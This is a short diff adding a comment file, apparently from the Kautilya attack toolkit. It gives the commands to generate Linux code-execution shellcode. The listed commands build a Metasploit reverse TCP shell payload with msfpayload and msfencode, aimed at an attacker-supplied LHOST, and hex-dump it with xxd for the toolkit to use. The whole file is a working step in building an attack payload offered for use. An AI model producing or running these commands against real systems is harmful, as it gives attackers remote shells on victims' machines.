@@ -1,0 +1,6 @@
+
+#Use these commands to generate shellcode for Linux Code Execution payload of Kautilya. You need xxd installed on your machine to run this.
+#The generated shellcode file linux_codeexec.txt is to be copied to src directory of Kautilya.
+
+./msfpayload linux/x86/shell_reverse_tcp LHOST=<IP> R | ./msfencode -a x86 -t elf -o linux_payload 
+xxd -ps linux_payload > linux_codeexec.txt
